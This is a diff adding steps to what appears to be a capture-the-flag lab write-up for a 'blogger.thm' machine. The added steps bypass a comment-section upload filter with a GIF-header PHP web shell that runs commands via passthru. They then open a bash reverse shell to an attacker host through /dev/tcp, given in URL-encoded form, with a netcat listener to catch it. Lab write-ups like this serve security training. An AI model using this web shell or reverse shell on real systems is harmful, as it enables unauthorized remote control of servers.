@@ -208,6 +208,36 @@ Interesting Finding(s):
 [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
 
 ```
+## Lead
+
+- In the fonts section we have the blog post page, that blog has the href with blogger.thm , so add the host with the blogger.thm to render get render the page correctly.
+
+in `/etc/hosts` list add `<ip>   blogger.thm`
+
+- In the post comment section there is a file upload vuln founded, we can upload a PHP file with the GIF format, like
+```php
+GIF89a
+<?php
+echo "<pre>";
+passthru($_GET['cmd']);
+echo "</pre>";
+```
+- save the file and upload in php format itself so we can open it and execute the commands and visualize in another page.
+- after uploading right click on the php file and open in new tab and in the URL use `?cmd= <commands>`
+
+## Spwning a shell
+
+```bash
+bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
+```
+
+- Even though we can't excecute it directly because the URL sanitization is happening , so insert the command as URL encoded.
+`bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.51%2F9090%200%3E%261%27`
+
+- Use a netcat listener `nc -nvlp 9090` at the host machine and then paste the URL encoded command in the `?cmd= <command>`
+
+## user flag enumeration 
+![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/94ccc6d9-9ff2-4d90-ac0c-4ee9310494ba)
 
 ## Root - Privilage Escalation
 
